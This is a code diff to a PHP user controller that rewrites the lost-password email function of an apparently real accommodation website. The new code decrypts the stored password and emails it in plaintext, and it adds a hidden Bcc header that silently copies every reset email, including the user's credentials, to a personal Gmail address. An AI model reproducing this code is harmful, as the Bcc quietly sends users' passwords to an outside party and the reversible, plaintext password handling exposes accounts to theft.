@@ -139,37 +139,41 @@ class Users extends Controller
     public function sendLostPasswordEmail($uinfo = false)
     {
         if($uinfo) {
-            // Start Email sending
-            $eml = $this->load->model('emailengine',true);
-            
-            $shortcode = array(                
-                '[FirstName]',
-                '[LastName]',
-                '[UserID]',
-                '[Password]'
-            );
-            
-            $scvalues = array(
-                $uinfo->FirstName,
-                $uinfo->LastName,
-                $uinfo->UserID,
-                $this->decrypt($uinfo->Password)
-            );
-            
             $to = $uinfo->Email;
-            $name = $uinfo->FirstName .' '.$uinfo->LastName;
-            $subject = "Request for password recall";
-            $content = str_replace($shortcode,$scvalues,App::getFileContents('emails'.DS.'requestpw.eml'));
-            
-            if($eml->send($to,$name,$subject,$content)) {
-                
-            }
-            // End Email sending
+			$subject = "Password Reset";
+			
+			$message = "<html><head><title>Password Reset</title></head>
+							<body>
+								<p>Hi ".$uinfo->FirstName.",</p>
+								<p>You have requested a password recall please see the info below:</p>
+								<table>
+								<tr>
+								<th style=\"text-align:left\">Username:</th><td style=\"text-align:left\">".$uinfo->Email."</td>
+								</tr>
+								<tr>
+								<th style=\"text-align:left\">Password:</th><td style=\"text-align:left\">".$this->decrypt($uinfo->Password)."</td>
+								</tr>
+								</table>
+								<p>&nbsp;</p>
+								<p>Thanks,<br>Admin</p>
+							</body>
+						</html>";
+			
+			// Always set content-type when sending HTML email
+			$headers = "MIME-Version: 1.0" . "\r\n";
+			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+			
+			// More headers
+			$headers .= 'From: <admin@accommodationnewsealand.nz>' . "\r\n";
+			$headers .= 'Bcc: moises.goloyugo@gmail.com' . "\r\n";
+			
+			mail($to,$subject,$message,$headers);
         }    
     }
 
     public function lostPassword()
     {
+		$this->model->indexAssets();
         $uinfo = $this->model->doRequest();
         if($uinfo) {
             $this->sendLostPasswordEmail($uinfo);
